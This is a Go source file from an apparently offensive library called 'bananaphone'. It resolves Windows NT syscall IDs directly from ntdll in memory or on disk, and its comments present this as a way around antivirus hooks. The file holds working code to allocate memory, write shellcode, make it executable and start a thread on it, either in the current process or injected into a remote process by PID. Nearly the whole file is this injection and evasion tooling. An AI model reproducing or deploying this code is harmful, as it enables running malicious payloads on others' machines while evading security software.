package bananaphone

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

//Syscall calls the system function specified by callid with n arguments. Works much the same as syscall.Syscall - return value is the call error code and optional error text. All args are uintptrs to make it easy.
func Syscall(callid uint16, argh ...uintptr) (errcode uint32, err error)

//GetPEB returns the in-memory address of the start of PEB while making no api calls
func GetPEB() uintptr

//GetNtdllStart returns the start address of ntdll in memory
func GetNtdllStart() (start uintptr, size uintptr)

//getModuleLoadedOrder returns the start address of module located at i in the load order. This might be useful if there is a function you need that isn't in ntdll, or if some rude individual has loaded themselves before ntdll.
func getModuleLoadedOrder(i int) (start uintptr, size uintptr, modulepath *stupidstring)

//GetModuleLoadedOrderPtr returns a pointer to the ldr data table entry in full, incase there is something interesting in there you want to see.
func GetModuleLoadedOrderPtr(i int) *LdrDataTableEntry

//GetModuleLoadedOrder returns the start address of module located at i in the load order. This might be useful if there is a function you need that isn't in ntdll, or if some rude individual has loaded themselves before ntdll.
func GetModuleLoadedOrder(i int) (start uintptr, size uintptr, modulepath string) {
	var badstring *stupidstring
	start, size, badstring = getModuleLoadedOrder(i)
	modulepath = badstring.String()
	return
}

//Image contains info about a loaded image. Literally just a Base Addr and a Size - it should allow someone with a handy PE parser to pull the image out of memory...
type Image struct {
	BaseAddr uint64
	Size     uint64
}

//InMemLoads returns a map of loaded dll paths to current process offsets (aka images) in the current process. No syscalls are made.
func InMemLoads() (map[string]Image, error) {
	ret := make(map[string]Image)
	s, si, p := GetModuleLoadedOrder(0)
	start := p
	i := 1
	ret[p] = Image{uint64(s), uint64(si)}
	for {
		s, si, p = GetModuleLoadedOrder(i)
		if p != "" {
			ret[p] = Image{uint64(s), uint64(si)}
		}
		if p == start {
			break
		}
		i++
	}

	return ret, nil
}

//GetSysIDFromMemory takes the exported syscall name or ordinal and gets the ID it refers to (try not to supply both, it might not work how you expect). This function will not use a clean version of the dll, if AV has hooked the in-memory ntdll module, the results of this call may be bad.
func GetSysIDFromMemory(funcname string) (uint16, error) {
	return getSysIDFromMemory(funcname, 0, false)
}

//GetSysIDFromDiskOrd takes the exported ordinal and gets the ID it refers to. This function will access the ntdll file _on disk_, and relevant events/logs will be generated for those actions.
func GetSysIDFromDiskOrd(ordinal uint32) (uint16, error) {
	return getSysIDFromDisk("", ordinal, true)
}

//GetSysIDFromDisk takes the exported syscall name and gets the ID it refers to. This function will access the ntdll file _on disk_, and relevant events/logs will be generated for those actions.
func GetSysIDFromDisk(funcname string) (uint16, error) {
	return getSysIDFromDisk(funcname, 0, false)
}

const (
	thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
	memCommit  = uintptr(0x00001000)
	memreserve = uintptr(0x00002000)
)

//NtAllocateVirtualMemory is the function signature for the as-named syscall. Provide the syscall ID either dynamically (using a GetSysID function or similar), or hard-code it (but be aware that the ID changes in different versions of Windows).
/*
	__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
		HANDLE    ProcessHandle,
		PVOID     *BaseAddress,
		ULONG_PTR ZeroBits,
		PSIZE_T   RegionSize,
		ULONG     AllocationType,
		ULONG     Protect
		);
*/
func NtAllocateVirtualMemory(sysid uint16, processHandle uintptr, baseAddress *uintptr, zeroBits uintptr, regionSize *uintptr, allocationType, protect uintptr) (uint32, error) {
	return Syscall(
		sysid, //ntallocatevirtualmemory
		thisThread,
		uintptr(unsafe.Pointer(baseAddress)),
		0,
		uintptr(unsafe.Pointer(regionSize)),
		allocationType,
		protect,
	)
}

//WriteMemory writes the provided memory to the specified memory address. Does **not** check permissions, may cause panic if memory is not writable etc.
func WriteMemory(inbuf []byte, destination uintptr) {
	for index := uint32(0); index < uint32(len(inbuf)); index++ {
		writePtr := unsafe.Pointer(destination + uintptr(index))
		v := (*byte)(writePtr)
		*v = inbuf[index]
	}
}

//NtProtectVirtualMemory is the function signature for the as-named syscall.
/*
	NtProtectVirtualMemory(
	  IN  HANDLE ProcessHandle,
	  IN OUT PVOID *BaseAddress,
	  IN OUT PULONG RegionSize,
	  IN  ULONG NewProtect,
	  OUT PULONG OldProtect
	  );
*/
func NtProtectVirtualMemory(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr, NewProtect uintptr, oldprotect *uintptr) (uint32, error) {

	return Syscall(
		sysid,
		thisThread,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		NewProtect,
		uintptr(unsafe.Pointer(oldprotect)),
	)
}

//NtCreateThreadEx is the function signature for the as-named syscall. Provide the syscall ID either dynamically (using a GetSysID function or similar), or hard-code it (but be aware that the ID changes in different versions of Windows).
/*
	 NTSTATUS (WINAPI *LPFUN_NtCreateThreadEx)
	(
	  OUT PHANDLE hThread,
	  IN ACCESS_MASK DesiredAccess,
	  IN LPVOID ObjectAttributes,
	  IN HANDLE ProcessHandle,
	  IN LPTHREAD_START_ROUTINE lpStartAddress,
	  IN LPVOID lpParameter,
	  IN BOOL CreateSuspended,
	  IN ULONG StackZeroBits,
	  IN ULONG SizeOfStackCommit,
	  IN ULONG SizeOfStackReserve,
	  OUT LPVOID lpBytesBuffer
	);
*/
func NtCreateThreadEx(sysid uint16, hostThread *uintptr,
	DesiredAccess, ObjectAttributes, ProcessHandle, LpStartAddress,
	LpParameter, Createsuspended, StackZeroBits, sizeofstackcommit,
	SizeOfStackReserve, lpBytesBuffer uintptr) (uint32, error) {

	return Syscall(
		sysid,                               //NtCreateThreadEx
		uintptr(unsafe.Pointer(hostThread)), //hthread
		DesiredAccess,                       //desiredaccess
		ObjectAttributes,                    //objattributes
		ProcessHandle,                       //processhandle
		LpStartAddress,                      //lpstartaddress
		LpParameter,                         //lpparam
		Createsuspended,                     //createsuspended
		StackZeroBits,                       //zerobits
		sizeofstackcommit,                   //sizeofstackcommit
		SizeOfStackReserve,                  //sizeofstackreserve
		lpBytesBuffer,                       //lpbytesbuffer
	)
}

//CreateThreadDisk executes shellcode in the current thread, resolving sysid's from disk. (See CreateThread for more details)
func CreateThreadDisk(shellcode []byte) {
	ntalloc, _ := GetSysIDFromDisk("NtAllocateVirtualMemory")
	ntprotect, _ := GetSysIDFromDisk("NtProtectVirtualMemory")
	ntcreate, _ := GetSysIDFromDisk("NtCreateThreadEx")
	CreateThread(shellcode, thisThread, ntalloc, ntprotect, ntcreate)
}

//CreateThreadMem executes shellcode in the current thread, resolving sysid's from memory. (See CreateThread for more details)
func CreateThreadMem(shellcode []byte) {
	ntalloc, _ := GetSysIDFromMemory("NtAllocateVirtualMemory")
	ntprotect, _ := GetSysIDFromMemory("NtProtectVirtualMemory")
	ntcreate, _ := GetSysIDFromMemory("NtCreateThreadEx")
	CreateThread(shellcode, thisThread, ntalloc, ntprotect, ntcreate)
}

const (
	//ProcessAllAccess STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xfff
	ProcessAllAccess = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
)

//CreateRemoteThreadMemory does CreateThread with the specified shellcode and PID, reading sysid's from memory. (See CreateRemoteThread for more info).
func CreateRemoteThreadMemory(shellcode []byte, pid uint32) {
	h, _ := windows.OpenProcess(ProcessAllAccess, false, pid)
	ntalloc, _ := GetSysIDFromMemory("NtAllocateVirtualMemory")
	ntprotect, _ := GetSysIDFromMemory("NtProtectVirtualMemory")
	ntcreate, _ := GetSysIDFromMemory("NtCreateThreadEx")
	CreateThread(shellcode, uintptr(h), ntalloc, ntprotect, ntcreate)
}

//CreateRemoteThreadDisk does CreateThread with the specified shellcode and PID, reading sysid's from disk. (See CreateRemoteThread for more info).
func CreateRemoteThreadDisk(shellcode []byte, pid uint32) {
	h, _ := windows.OpenProcess(ProcessAllAccess, false, pid)
	ntalloc, _ := GetSysIDFromDisk("NtAllocateVirtualMemory")
	ntprotect, _ := GetSysIDFromDisk("NtProtectVirtualMemory")
	ntcreate, _ := GetSysIDFromDisk("NtCreateThreadEx")
	CreateThread(shellcode, uintptr(h), ntalloc, ntprotect, ntcreate)
}

/*
CreateThread takes shellcode, and a handle, and performs NtAllocate, NtProtect, and finally an NtCreateThread. Provide Syscall ID's either dynamically (using a GetSysID function or similar), or hard-code it (but be aware that the ID changes in different versions of Windows).

**Fair warning**: there is no wait in here. Threads are hard, and creating a thread in a remote process seems to create a race condition of some sort that kills a bunch of stuff. YMMV, use with caution etc.

Relevant enums for each of the functions can be found below:
	NtAllocateVirtualMemory
		memCommit|memreserve,
		syscall.PAGE_READWRITE,

	NtProtectVirtualMemory
		syscall.PAGE_EXECUTE_READ,

	NtCreateThreadEx
		0x1FFFFF (THREAD_ALL_ACCESS)
*/
func CreateThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {
	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r, _ := NtAllocateVirtualMemory(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		&baseA,
		0,
		&regionsize,
		memCommit|memreserve,
		syscall.PAGE_READWRITE,
	)
	if r != 0 {
		fmt.Printf("1 %x\n", r)
		return
	}
	//write memory
	WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	r, _ = NtProtectVirtualMemory(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		&baseA,
		&regionsize,
		syscall.PAGE_EXECUTE_READ,
		&oldprotect,
	)
	if r != 0 {
		fmt.Printf("2 %x\n", r)
		return
	}
	var hhosthread uintptr
	r, _ = NtCreateThreadEx(
		NtCreateThreadExSysid, //NtCreateThreadEx
		&hhosthread,           //hthread
		0x1FFFFF,              //desiredaccess
		0,                     //objattributes
		handle,                //processhandle
		baseA,                 //lpstartaddress
		0,                     //lpparam
		uintptr(0),            //createsuspended
		0,                     //zerobits
		0,                     //sizeofstackcommit
		0,                     //sizeofstackreserve
		0,                     //lpbytesbuffer
	)
	time.Sleep(time.Second * 2)
	if r != 0 {
		fmt.Printf("3 %x\n", r)
		return
	}
}
